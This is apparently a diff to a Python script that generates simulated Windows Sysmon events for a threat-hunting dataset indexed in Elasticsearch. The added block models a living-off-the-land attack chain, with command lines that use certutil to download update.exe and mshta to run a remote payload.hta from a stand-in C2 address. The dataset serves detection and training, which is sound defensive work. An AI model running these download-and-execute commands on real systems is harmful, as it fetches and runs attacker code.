@@ -185,6 +185,63 @@ def generate_dataset():
     })
 
     # =========================================================================
+    # CADENA DE ATAQUE 1b: LOTL - Certutil + Mshta Download
+    # =========================================================================
+    lotl_time = base_time + timedelta(hours=2, minutes=45)
+
+    # Certutil download
+    events.append({
+        "event_id": 1, "event_description": "Process Create",
+        "timestamp": lotl_time.isoformat(), "hostname": "WS-PC01",
+        "process_name": "certutil.exe",
+        "image": r"C:\Windows\System32\certutil.exe",
+        "user": "CORP\\user01", "pid": 7800,
+        "parent_image": r"C:\Windows\System32\cmd.exe",
+        "parent_pid": 7700, "parent_name": "cmd.exe",
+        "command_line": r"certutil.exe -urlcache -split -f http://198.51.100.10/update.exe C:\Users\user01\AppData\Local\Temp\update.exe",
+        "hashes": f"SHA256={sha256('certutil.exe')}",
+        "integrity_level": "Medium",
+        "category": "execution", "severity": "critical",
+        "mitre_tactic": "Command and Control", "mitre_technique": "T1105",
+        "attack_chain": "lotl_certutil",
+        "hunt_note": "certutil abused to download payload from C2"
+    })
+
+    # Mshta execution
+    events.append({
+        "event_id": 1, "event_description": "Process Create",
+        "timestamp": (lotl_time + timedelta(minutes=5)).isoformat(), "hostname": "WS-PC01",
+        "process_name": "mshta.exe",
+        "image": r"C:\Windows\System32\mshta.exe",
+        "user": "CORP\\user01", "pid": 7850,
+        "parent_image": r"C:\Windows\System32\cmd.exe",
+        "parent_pid": 7700, "parent_name": "cmd.exe",
+        "command_line": r"mshta.exe http://198.51.100.10/payload.hta",
+        "hashes": f"SHA256={sha256('mshta.exe')}",
+        "integrity_level": "Medium",
+        "category": "execution", "severity": "critical",
+        "mitre_tactic": "Defense Evasion", "mitre_technique": "T1218.005",
+        "attack_chain": "lotl_certutil",
+        "hunt_note": "mshta.exe executing remote HTA payload"
+    })
+
+    # Mshta network connection
+    events.append({
+        "event_id": 3, "event_description": "Network Connection",
+        "timestamp": (lotl_time + timedelta(minutes=5, seconds=2)).isoformat(), "hostname": "WS-PC01",
+        "process_name": "mshta.exe",
+        "image": r"C:\Windows\System32\mshta.exe",
+        "user": "CORP\\user01", "pid": 7850,
+        "destination_ip": "198.51.100.10", "destination_port": 80,
+        "destination_hostname": "cdn-static-assets.com",
+        "source_ip": "10.0.1.50", "source_port": 51300,
+        "protocol": "tcp", "initiated": True,
+        "category": "c2", "severity": "critical",
+        "mitre_tactic": "Command and Control", "mitre_technique": "T1071.001",
+        "attack_chain": "lotl_certutil"
+    })
+
+    # =========================================================================
     # CADENA DE ATAQUE 2: DLL Injection via CreateRemoteThread
     # =========================================================================
     attack2_time = base_time + timedelta(hours=3, minutes=10)
@@ -574,11 +631,13 @@ def main():
                 "event_type": {"type": "keyword"},
                 "query_name": {"type": "keyword"},
                 "query_results": {"type": "keyword"},
-                "query_status": {"type": "keyword"},
+                                "query_status": {"type": "keyword"},
+                "pipe_name": {"type": "keyword"},
+                "simulated": {"type": "boolean"},
+                "simulated_at": {"type": "date"},
             }
         }
     }
-
     es.indices.delete(index=INDEX, ignore=[404])
     es.indices.create(index=INDEX, mappings=mapping["mappings"])
 
